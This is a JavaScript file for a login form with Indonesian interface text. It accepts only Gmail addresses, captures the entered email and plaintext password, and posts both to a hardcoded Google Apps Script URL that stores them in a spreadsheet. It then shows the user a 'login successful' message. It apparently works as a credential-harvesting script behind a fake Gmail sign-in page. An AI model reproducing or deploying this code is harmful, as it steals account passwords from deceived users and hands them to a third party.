const loginForm = document.getElementById('loginForm');
const submitButton = document.querySelector('.btn-primary');

loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;

    if (!email.endsWith('@gmail.com')) {
        alert('Harap gunakan email Gmail.');
        return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'Mengirim...';

    try {
        console.log('Mengirim data:', { email, password });
        await saveToSpreadsheet(email, password);
        console.log('Data berhasil dikirim');
        alert('Login berhasil! Data telah disimpan.');
        loginForm.reset();
    } catch (error) {
        console.error('Error:', error);
        alert('Gagal mengirim data. Pastikan Apps Script sudah diatur dan jaringan tersambung.');
    } finally {
        submitButton.disabled = false;
        submitButton.textContent = 'Masuk';
    }
});

function loginWithGoogle() {
    alert('Fitur login Google masih dalam versi simulasi. Gunakan login manual sementara.');
}

function saveToSpreadsheet(email, password) {
    const scriptURL = 'https://script.google.com/macros/s/AKfycbysF_IYa4HkiajJA6Qx08YS9Ha2ZpUxfpnWJOfWoVYdtQJ6RHHRqNxGetP3-DJmzLoHuw/exec';

    return fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({ email, password }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        console.log('Response status:', response.status);
        console.log('Response received');
        return response;
    })
    .catch(error => {
        console.error('Fetch error:', error);
        throw error;
    });
}
